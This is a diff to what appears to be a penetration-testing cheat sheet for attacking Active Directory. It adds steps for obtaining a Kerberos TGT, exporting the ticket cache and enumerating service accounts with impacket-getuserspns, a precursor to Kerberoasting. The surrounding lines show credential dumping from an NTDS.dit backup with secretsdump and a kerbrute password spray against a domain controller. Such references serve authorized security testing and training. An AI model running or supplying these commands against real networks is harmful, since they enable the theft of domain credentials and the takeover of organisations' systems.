@@ -639,3 +639,27 @@ impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
 ./kerbrute passwordspray -d domain.local --dc dc01.domain.local password.txt username
 ```
 
+# NTLM disabled and working with Kerberos TGT/TGS
+TGT is coupon code for buing a ticket in the cinema
+
+TGS is a ticket for specific movie in the cinema
+
+**In kerberos use hostname instead of IP address**
+
+- Get TGT
+```
+impacket-gettgt domain.local/username:password
+```
+- Export ticket
+```
+export KRB5CCNAME=tgtticketfile.cache
+```
+- Verify by:
+```
+klist
+```
+- Get User SPNs
+```
+impacket-getuserspns domain.local/username:password -dc-host dc01.domain.local -k -no-pass
+```
+
